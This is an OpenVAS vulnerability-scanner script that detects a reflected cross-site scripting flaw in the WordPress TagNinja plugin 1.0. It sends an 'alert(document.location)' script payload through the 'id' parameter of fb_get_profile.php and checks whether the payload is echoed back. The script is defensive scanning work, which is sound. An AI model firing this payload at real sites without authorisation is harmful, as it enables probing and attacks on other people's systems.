###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_tagninja_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# WordPress TagNinja Plugin 'id' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary code in
  the context of an application.
  Impact Level: Application";
tag_affected = "WordPress TagNinja Plugin version 1.0";
tag_insight = "The flaw is caused by improper validation of user-supplied input passed via
  the 'id' parameter to wp-content/plugins/tagninja/fb_get_profile.php, that
  allows attackers to execute arbitrary HTML and script code on the web server.";
tag_solution = "No solution or patch is available as of 15th February, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/tagninja/";
tag_summary = "This host is running WordPress and is prone to cross site scripting
  vulnerability.";

if(description)
{
  script_id(801850);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
  script_bugtraq_id(46090);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("WordPress TagNinja Plugin 'id' Parameter Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/70737");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43132");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/98049/WordPressTagNinja1.0-xss.txt");

  script_description(desc);
  script_summary("Check if WordPress plugin is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (make_list("/wordpress", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application
  if("Powered by WordPress" >< res)
  {
    ## Construct attack request
    url = dir + '/wp-content/plugins/tagninja/fb_get_profile.php?id="><script>' +
                'alert(document.location)</script>';

    ## Try XSS and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header: TRUE,
                       pattern:"<script>alert\(document.location\)</script>"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
